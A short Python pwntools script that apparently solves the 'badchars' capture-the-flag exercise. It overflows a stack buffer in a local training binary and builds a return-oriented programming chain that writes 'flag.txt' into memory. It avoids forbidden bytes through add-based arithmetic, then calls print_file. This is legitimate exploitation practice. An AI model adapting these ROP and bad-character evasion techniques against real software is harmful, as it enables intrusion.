from pwn import *
import sys

# nm callme | grep ' t '
# 0000000000400617 t usefulFunction
# 0000000000400628 t usefulGadgets

binary = './badchars'
if len(sys.argv) == 2:
    r = gdb.debug([binary], '''
    b *0x000000000040060b
    ''')
else:
    r = process([binary])

def write_str(addr, s, badchars):
    add_r14b_at_r15b = 0x40062c
    pop_r14_r15 = 0x4006a0
    
    chain = ''
    for i, c in enumerate(s):
        c_code = ord(c)
        if c in badchars:
            sub = 0x20
            c_code -= sub

            chain += p64(pop_r14_r15) + p64(sub) + p64(addr + i)
            chain += p64(add_r14b_at_r15b)
            
        chain += p64(pop_r14_r15) + p64(c_code) + p64(addr + i)
        chain += p64(add_r14b_at_r15b)

    return chain

badchars = 'xga.'

where_write = 0x60102f
print_file_addr = 0x400510
ret_addr = 0x400616
pop_rdi = 0x4006a3

chain = write_str(where_write, 'flag.txt', badchars)
chain += p64(pop_rdi) + p64(where_write)
chain += p64(print_file_addr)

#print repr(chain)

payload = 'A' * cyclic_find('kaaalaaa') + chain
r.sendline(payload)

r.interactive()

